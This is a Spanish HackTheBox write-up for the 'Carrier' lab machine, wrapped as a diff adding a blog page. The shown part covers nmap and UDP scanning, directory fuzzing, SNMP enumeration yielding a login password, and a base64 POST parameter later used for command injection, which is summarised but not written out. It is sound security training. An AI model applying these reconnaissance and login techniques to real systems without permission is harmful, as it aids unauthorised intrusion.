@@ -1,0 +1,1792 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Carrier</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Carrier | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Carrier" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Linux nivel medio. Enumeraremos bastante y leeremos más. Jugaremos con SNMP, inyección de comandos de un proceso en la web yyyyyy una locura llamada BGP Hijacking. Interceptaremos el tráfico de un servidor FTP para obtener credenciales de acceso." />
+<meta property="og:description" content="Máquina Linux nivel medio. Enumeraremos bastante y leeremos más. Jugaremos con SNMP, inyección de comandos de un proceso en la web yyyyyy una locura llamada BGP Hijacking. Interceptaremos el tráfico de un servidor FTP para obtener credenciales de acceso." />
+<link rel="canonical" href="http://localhost:4000/htb/carrier" />
+<meta property="og:url" content="http://localhost:4000/htb/carrier" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-07-29T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155banner.png" />
+<meta property="twitter:title" content="HackTheBox - Carrier" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-07-29T00:00:00-07:00","datePublished":"2021-07-29T00:00:00-07:00","description":"Máquina Linux nivel medio. Enumeraremos bastante y leeremos más. Jugaremos con SNMP, inyección de comandos de un proceso en la web yyyyyy una locura llamada BGP Hijacking. Interceptaremos el tráfico de un servidor FTP para obtener credenciales de acceso.","headline":"HackTheBox - Carrier","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/carrier"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/carrier"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Carrier</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-07-29">29 Jul 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155banner.png" alt="HackTheBox - Carrier">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina Linux nivel medio. Enumeraremos bastante y leeremos más. Jugaremos con <strong>SNMP</strong>, inyección de comandos de un proceso en la web yyyyyy una locura llamada <strong>BGP Hijacking</strong>. Interceptaremos el tráfico de un servidor <strong>FTP</strong> para obtener credenciales de acceso.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155carrierHTB.png" alt="155carrierHTB" /></p>
+
+<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>
+
+<p><strong>Creada por</strong>: <a href="https://www.hackthebox.eu/profile/9267">snowscan</a>.</p>
+
+<p>¡Que lindura como vamos a escalar esta cosaaaaaaaaaaaaaaaaa!!</p>
+
+<p>Nos encontraremos con un servidor web con varios recursos fuera de nuestra vista, recolectaremos varias cositas para nuestro privesc. En la web tendremos un <code>login</code>, pero vamos a estar ciegos probando cosas.</p>
+
+<p>Enumerando los puertos <code>UDP</code> encontraremos un servicio <code>SNMP</code> activo, jugando con <code>snmpwalk</code> veremos que devuelve una línea algo extraña al ver sus recursos. Si concatenamos lo encontrado antes, nuestro research y esta cadena, conseguiremos iniciar sesión en la web como el usuario <code>admin</code>.</p>
+
+<p>Estando dentro encontraremos una parte que devuelve el resultado de -listar procesos internos- en la web, para saber que proceso listar usa una variable que es enviada en <strong>base64</strong> y por el método <code>POST</code>. Si nos ponemos traviesos con esa variable lograremos inyectar comandos en el sistema, nos aprovecharemos de esto para generar una <strong>reverse Shell</strong> como el usuario que sostiene la web, en este caso <code>root</code>.</p>
+
+<p>Pues ya estaría ¿no? pos no :)</p>
+
+<p>Enumerando el sistema nos daremos cuenta de que estamos dentro de un router :O (acá empezamos a concatenar lo encontrado al inicio), tendremos acceso a su configuración por medio de una <code>CLI</code> de la herramienta <code>Quagga</code>.</p>
+
+<p>Jugando y jugando veremos que necesitamos realizar un ataque llamado <code>BGP Hijacking</code>, tomando de nuevo lo encontrado al inicio sabremos que existen <code>3</code> routers, nosotros y dos más, hay un host entre tooodos los routers (obtenemos el segmento también de nuestra enum inicial) que esta conectándose a un servidor <code>FTP</code>, la idea con nuestro ataque es decirle a los dos routers (que están enviándose la data del server <strong>FTP</strong>) que nos posicionen como <strong>“la mejor ruta”</strong> para enviar la data de un lado a otro. Y de que nos sirve esto….</p>
+
+<p>Sencillamente para interceptar toooodo el tráfico (en este caso) <code>FTP</code> que se estén enviando. Mediante este ataque (mmoooooooooooy lindo) vamos a conseguir ver las credenciales de acceso del usuario <code>root</code> al servidor <strong>FTP</strong>, haciendo reutilización de contraseñas lograremos una Shell por medio de <code>SSH</code> como el usuario <code>root</code>, ahora si en la máquina <strong>Carrier</strong>.</p>
+
+<p>…</p>
+
+<h4 id="clasificación-de-la-máquina-según-la-gentesita">Clasificación de la máquina según la gentesita</h4>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;" /></p>
+
+<p>Bastante real y 0 juegos, vamos a hablar con las manitos.</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo mostrar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>Es que a veces no vemos porque no queremos.</p>
+
+<ol>
+  <li><a href="#enumeracion">Enumeración</a>.
+    <ul>
+      <li><a href="#enum-nmap">Enumeración de puertos con nmap</a>.</li>
+      <li><a href="#puerto-80">Enumeramos servidor web en el puerto 80, varios recursos, principalmente un <strong>Login Panel</strong></a>.</li>
+      <li><a href="#snmpwalk-creds">Logramos pasar el login encontrando credenciales por <strong>SNMP</strong></a>.</li>
+    </ul>
+  </li>
+  <li><a href="#explotacion">Explotación, inyectamos comandos en un apartado del servidor web</a>.</li>
+  <li><a href="#escalada-de-privilegios-bgp">Escalada de privilegios, jugueteo con el protocolo BPG, intentando <strong>BGP Hijacking</strong></a>.
+    <ul>
+      <li><a href="#bgp-explain">Hablamos un poco sobre el protocolo BGP y sus características</a>.</li>
+      <li><a href="#cli-quagga-vtysh">Exploramos <strong>CLI</strong> de <strong>Quagga</strong> para comunicarnos con los sistemas autónomos de BGP</a>.</li>
+      <li><a href="#fail-bgp-hijacking-ftp">Logramos <strong>BGP Hijacking</strong> peeero con un fallito</a>.</li>
+      <li><a href="#done-bgp-hijacking-ftp">Ahora si logramos <strong>BGP Hijacking</strong> y encontramos credenciales en tráfico FTP</a>.</li>
+    </ul>
+  </li>
+</ol>
+
+<p>…</p>
+
+<h2 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h2>
+
+<hr />
+
+<h3 id="enum-nmap">Enumeración de puertos con nmap <a href="#enum-nmap">🔗</a></h3>
+
+<p>Vamos a empezar como siempre por nuestro escaneo de puertos:</p>
+
+<pre><code class="language-bash">❱ nmap -p- --open -v 10.10.10.105 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función <strong>extractPorts</strong></a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Obtenemos:</p>
+
+<pre><code class="language-bash">❱ cat initScan
+# Nmap 7.80 scan initiated Tue Jul 27 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.105
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.105 () Status: Up
+Host: 10.10.10.105 () Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
+# Nmap done at Tue Jul 27 25:25:25 2021 -- 1 IP address (1 host up) scanned in 237.32 seconds
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td style="text-align: left"><strong><a href="https://www.hackingarticles.in/ssh-penetration-testing-port-22/">SSH</a></strong>: Para obtener Shells seguras.</td>
+    </tr>
+    <tr>
+      <td>80</td>
+      <td style="text-align: left"><strong><a href="https://searchnetworking.techtarget.com/definition/port-80">HTTP</a></strong>: Un servidor web.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Ahora con los puertos podemos realizar un segundo escaneo, pero para encontrar que versiones y scripts están siendo usados por cada servicio:</p>
+
+<p><strong>~(Usando la función <code>extractPorts</code> (referenciada antes) podemos copiar rápidamente los puertos en la clipboard, así no tenemos que ir uno a uno, en este caso no es relevante, ya que solo tenemos 2 puertos, pero pues cuando tengamos muchos esta herramienta es brutal</strong></p>
+
+<pre><code class="language-bash">❱ extractPorts initScan 
+[*] Extracting information...
+
+    [*] IP Address: 10.10.10.105
+    [*] Open ports: 22,80
+
+[*] Ports copied to clipboard
+</code></pre>
+
+<p><strong>)~</strong></p>
+
+<pre><code class="language-bash">❱ nmap -p 22,80 -sC -sV 10.10.10.105 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Con este escaneo recibimos:</p>
+
+<pre><code class="language-bash">❱ cat portScan
+# Nmap 7.80 scan initiated Tue Jul 27 25:25:25 2021 as: nmap -p 22,80 -sC -sV -oN portScan 10.10.10.105
+Nmap scan report for 10.10.10.105
+Host is up (0.11s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 15:a4:28:77:ee:13:07:06:34:09:86:fd:6f:cc:4c:e2 (RSA)
+|   256 37:be:de:07:0f:10:bb:2b:b5:85:f7:9d:92:5e:83:25 (ECDSA)
+|_  256 89:5a:ee:1c:22:02:d2:13:40:f2:45:2e:70:45:b0:c4 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Login
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Jul 27 25:25:25 2021 -- 1 IP address (1 host up) scanned in 22.76 seconds
+</code></pre>
+
+<p>Podemos destacar:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">22</td>
+      <td style="text-align: left">SSH</td>
+      <td style="text-align: left">OpenSSH 7.6p1</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">80</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left">Apache httpd 2.4.18</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>No vemos nada más, así que empecemos a darle y descubramos por donde romper la máquina.</p>
+
+<p>…</p>
+
+<h3 id="puerto-80">Puerto 80 <a href="#puerto-80">🔗</a></h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155page80.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Nos encontramos con un <strong>login panel</strong>, unos errores y un nombre al parecer de un servicio, <code>Lyghtspeed</code>. Buscando info en la web sobre él no concluimos nada, así que sigamos enumerando.</p>
+
+<p>Usando paylaods y credenciales conocidas en el login no logramos acceder, hagamos un fuzzeo de directorios a ver si existen objetos fuera a nuestra vista:</p>
+
+<pre><code class="language-bash">❱ dirsearch.py -w /opt/SecLists/Discovery/Web-Content/common.txt -u http://10.10.10.105/
+...
+Target: http://10.10.10.105/
+
+[25:25:25] Starting: 
+[25:25:25] 301 -  310B  - /css  -&gt;  http://10.10.10.105/css/
+[25:25:25] 301 -  312B  - /debug  -&gt;  http://10.10.10.105/debug/
+[25:25:25] 301 -  310B  - /doc  -&gt;  http://10.10.10.105/doc/
+[25:25:25] 301 -  312B  - /fonts  -&gt;  http://10.10.10.105/fonts/
+[25:25:25] 301 -  310B  - /img  -&gt;  http://10.10.10.105/img/
+[25:25:25] 200 -    1KB - /index.php
+[25:25:25] 301 -  309B  - /js  -&gt;  http://10.10.10.105/js/
+[25:25:25] 403 -  300B  - /server-status
+[25:25:25] 301 -  312B  - /tools  -&gt;  http://10.10.10.105/tools/
+...
+</code></pre>
+
+<p>Dos interesantes, si profundizamos un toque más, vemos otro recurso:</p>
+
+<pre><code class="language-bash">❱ dirsearch.py -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.10.10.105/
+...
+[12:55:51] 301 -  312B  - /debug  -&gt;  http://10.10.10.105/debug/
+...
+</code></pre>
+
+<p>Así que tenemos inicialmente <strong>3</strong> recursos fuera de nuestra vista:</p>
+
+<ul>
+  <li><code>/doc</code></li>
+  <li><code>/debug</code>.</li>
+  <li><code>/tools</code>.</li>
+</ul>
+
+<p>Empecemos a ver si hay algo en ellos:</p>
+
+<h5 id="-http101010105doc">~ <u>http://10.10.10.105/doc/</u>:</h5>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155page80_doc.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Dos archivos, bien, veamos otro recurso.</p>
+
+<h5 id="-http101010105debug">~ <u>http://10.10.10.105/debug/</u>:</h5>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155page80_debug.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>El resultado de ejecutar <code>phpinfo()</code>, ¿se ve la flecha? Hay varias cositas para leer en este recurso, sigamos con el otro.</p>
+
+<h5 id="-http101010105tools">~ <u>http://10.10.10.105/tools/</u>:</h5>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155page80_tools.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Otro archivo.</p>
+
+<p>Ahora que encontramos todos los recursos veamos si nos son de utilidad para jugar con el login…</p>
+
+<p>…</p>
+
+<h5 id="-http101010105doc-1">~ <u>http://10.10.10.105/doc/</u>:</h5>
+
+<hr />
+
+<p>🛎️ <code>error_codes.pdf</code></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155page80_doc_errorcode.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Bien, este documento parece super interesante e importante para seguir, nos muestra varios errores (donde vemos dos con el código que vimos en el login, así que podemos tomar su definición y relacionarla), pero lo llamativo es el servicio del cual son originarios, <code>CW1000-X Lyghtspeed Management Platform v1.0.4</code>, el nombre es muy largo y si lo buscamos en internet lo que nos podemos encontrar son puros spoilers jajaj, así que rompamos la cadena.</p>
+
+<p>Sabemos que es una plataforma de gestión en su versión <code>1.0.4</code>, <code>Lyghtspeed</code> ya lo habíamos buscado así que no nos interesa y nos quedaría <code>CW1000-X</code>, que si buscamos en la web, encontramos que es un <strong>Access Controller (AC)</strong>:</p>
+
+<blockquote>
+  <p>“Es una tecnología que permite controlar de forma muy granular qué dispositivos pueden acceder a la red, permitiendo establecer políticas de gestión en los dispositivos” esto según <a href="https://www.secureit.es/sistemas-de-seguridad-it/network-access-control-nac/">secure.it</a>.</p>
+</blockquote>
+
+<p>Pues muy rico, todo lo que encontramos habla de <code>Access Controller</code>.</p>
+
+<p>Encontramos otro <a href="https://sysnetcenter.com/documents/ip-com-cw1000-user-guide.pdf">recurso</a> que muestra una guía de usuario para un controlador de acceso, es muy interesante, échenle un ojito. Algo que encontramos en él (y en búsquedas) son unas credenciales que vienen detrás del dispositivo:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155google_userguide_ac_creds.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<ul>
+  <li><code>admin:admin</code> (son las credenciales que siempre intento primero en cualquier login 😝)</li>
+</ul>
+
+<p>Probando no logramos pasar el inicio de sesión, así que F.</p>
+
+<p>Nos quedaremos con lo encontrado y seguiremos (tiene sentido lo del AC por los errores y por lo que vamos a ver a continuación).</p>
+
+<p>🛎️ <code>diagram_for_tac.png</code></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155page80_doc_diagram_for_tac.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Un diagrama de routers, al inicio estaba súper “WTF que es estoooooooooooooooooooooooooo y que hagooooooooo”, pero con una simple búsqueda como <code>Lyghtspeed Networks</code> (que esta en la imagen, no me lo invente) vemos las relaciones y algunos spoilers que querrán traicionar nuestra mente, pero NOOO! nada de eso, vamos a investigar.</p>
+
+<blockquote>
+  <p>“Los routers guían y dirigen los datos de red mediante paquetes que contienen varios tipos de datos, como archivos, comunicaciones y transmisiones simples como interacciones web”, dicelo <a href="https://www.cisco.com/c/es_mx/solutions/small-business/resource-center/networking/what-is-a-router.html">cisco</a>.</p>
+</blockquote>
+
+<p>En el primer link vemos un recurso llamado <a href="https://medium.com/r3d-buck3t/bgp-hijacking-attack-7e6a30711246">BGP Hijacking Attack, Border Gateway Protocol, Network Routing, Internet Infrastructure</a>, (que si profundizamos MMMMMMUUUUUCHO sabemos que tiene spoilers, así que hacemos scroll hacia el inicio del archivo y vamos bajando muy despacio) al inicio esta lo que nos interesa 😬</p>
+
+<blockquote>
+  <p>“BGP is the routing protocol that runs the Internet. It manages how packets get routed from network to network by exchanging routing and reachability information.”, <a href="https://docs.nvidia.com/networking-ethernet-software/cumulus-linux-41/Layer-3/Border-Gateway-Protocol-BGP/">nvidia</a>.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>❗❗❗ <strong><em>PEEEEEEEEEEEEERO después de leer cositas de estas y relacionar lo único que tenemos (el <code>Login</code>) me di cuenta de que esta explicación no tiene mucho sentido aún, así que sigamos con los demás recursos y cuando llegue el momento (va a llegar seguro, por la imagen que vimos del diagrama y lo que se lee y ve en el artículo) volveremos a este loco tema…</em></strong></p>
+
+<p>…</p>
+
+<p>🛎️ Si revisamos el recurso <code>/tools/remote.php</code> nos devuelve:</p>
+
+<blockquote>
+  <p><span style="color: yellow;">License expired, exiting…</span></p>
+</blockquote>
+
+<p>Y poco más podemos hacer con él…</p>
+
+<p>Finalmente viendo el contenido de <code>/debug</code> (donde veíamos el resultado de la función <code>phpinfo()</code>) además de algunas versiones, no hay nada relevante. Así que tamos F :(</p>
+
+<p>…</p>
+
+<h3 id="snmpwalk-creds">Logramos pasar el login encontrando creds por <u>SNMP</u> <a href="#snmpwalk-creds">🔗</a></h3>
+
+<p>Después de leer lo del <strong>Access Controller</strong> se me dio por enumerar puertos <code>UDP</code> con <strong>nmap</strong> (usamos el parámetro <code>-sU</code>), quizás había algo de redes por ahí activo y sí, hay algo:</p>
+
+<pre><code class="language-bash">❱ nmap -sU -p- --open --min-rate=2000 -oG udpScan
+</code></pre>
+
+<p>El escaneo va super lento, por eso le agregamos el parámetro <code>--min-rate=N</code>, para indicarle que no envíe menos de N paquetes en cada petición, así va muuucho más rápido, el escaneo nos responde:</p>
+
+<pre><code class="language-bash"># Nmap 7.80 scan initiated Tue Jul 27 25:25:25 2021 as: nmap -sU -p- --open -v --min-rate=2000 -oG udpScan 10.10.10.105
+# Ports scanned: TCP(0;) UDP(65535;1-65535) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.105 () Status: Up
+Host: 10.10.10.105 () Ports: 161/open/udp//snmp///
+# Nmap done at Tue Jul 27 25:25:25 2021 -- 1 IP address (1 host up) scanned in 368.28 seconds
+</code></pre>
+
+<p>Puerto <code>161/udp</code> abierto, que con nuestro segundo escaneo confirmamos el servicio <strong>SNMP</strong> (digo confirmamos porque ya lo sabía al ver el puerto, pero quizás uds no e.e):</p>
+
+<pre><code class="language-bash"># Nmap 7.80 scan initiated Tue Jul 27 25:25:25 2021 as: nmap -sU -p 161 -sC -sV -oN udpPortScan 10.10.10.105
+Nmap scan report for 10.10.10.105
+Host is up (0.11s latency).
+
+PORT    STATE SERVICE VERSION
+161/udp open  snmp    SNMPv1 server; pysnmp SNMPv3 server (public)
+| snmp-info: 
+|   enterprise: pysnmp
+|   engineIDFormat: octets
+|   engineIDData: 77656201e85908
+|   snmpEngineBoots: 2
+|_  snmpEngineTime: 3h16m00s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Jul 27 25:25:25 2021 -- 1 IP address (1 host up) scanned in 10.35 seconds
+</code></pre>
+
+<p>Perfecto, exploremos un poquito el servicio:</p>
+
+<p>…</p>
+
+<blockquote>
+  <p>“SNMP - Simple Network Management Protocol is a protocol used to monitor different devices in the network (like routers, switches, printers, IoTs…)”, <a href="https://book.hacktricks.xyz/pentesting/pentesting-snmp">hacktricks</a>. Lo cual tiene muuuucho sentido, ya que hay un <strong>Access Controller</strong> activo, pueda que este servicio lo este monitoreando (: me gusta.</p>
+</blockquote>
+
+<p>Algunas cositas a tener en cuenta para saber que estamos haciendo con la siguiente herramienta, es entender o al menos intentarlo sobre la estructura que maneja SNMP para comunicarse, todo esta en este link:</p>
+
+<ul>
+  <li><a href="https://book.hacktricks.xyz/pentesting/pentesting-snmp">SNMP - Explained</a>.</li>
+</ul>
+
+<blockquote>
+  <p>No lo explico yo por que se alarga mucho y además esta super bien detallado ahí.</p>
+</blockquote>
+
+<p>Vamos a usar la herramienta <code>snmpwalk</code> con esta estructura:</p>
+
+<pre><code class="language-bash">❱ snmpwalk -v2c -c public 10.10.10.105
+</code></pre>
+
+<p>Donde en resumidas cuentas le decimos que nos extraiga del MIB (Base de gestión de la información) (que sería la data organizada jerárquicamente) todo lo relacionado con la comunidad <code>public</code>, muy resumido :P</p>
+
+<p>Pues ejecutándolo nos responde:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155bash_smnpwalk.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Solo dos líneas y una con un contenido medio extraño, pero a la vez con algo de sentido (NET..), se me dio por probar esa cadena (completa) contra el login y el usuario <code>admin</code> (que vimos en la guía de usuario e.e) pero nada :(</p>
+
+<p>PEEEEEEEEEEEEERO si le quitamos el <code>SN#</code> y volvemos a probaaaaaaaaaaaaaaaaaaaar.</p>
+
+<p>Tamos dentro pai:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155page80_dashboard.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<h3 id="login-done">Enumeramos recursos ya con una sesión dentro de la web <a href="#login-done">🔗</a></h3>
+
+<p>Inicialmente recordamos el output del recurso <code>remote.php</code> que hablaba sobre una licencia expirada, acá también sale algo así, pero diciendo que es inválida :(</p>
+
+<p>Hay algunos recursos para ver, caigamos en <code>tickets.php</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155page80_tickets.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Uff, varias cositas para leer, los tickets <code>5</code> y <code>6</code> están llamativos y el <code>8</code> habla de nuevo de <code>BGP</code>, jmmm, veamos que hay en <strong>Diagnostics</strong> (<code>diag.php</code>):</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155page80_diag.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Damos clic en <code>Verify Status</code> y obtenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155page80_diag_verifystatus.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Jmmm, parece un output de algún comando, si investigamos el código fuente del la web vemos esto:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155page80_diag_code_b64value.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Una cadena al parecer en <strong>base64</strong>, si la decodeamos tenemos:</p>
+
+<pre><code class="language-bash">❱ echo "cXVhZ2dh" | base64 -d
+quagga
+</code></pre>
+
+<p>Y si nos fijamos en las peticiones, vemos que ese campo es el que viaja con el método <strong>post</strong>, esto me llevo a profundizar con <strong>BurpSuite</strong> y mostrarles lo siguiente:</p>
+
+<p>Abrimos Burp, ponemos el proxy en escucha e interceptamos la petición:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155burp_diag_original.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
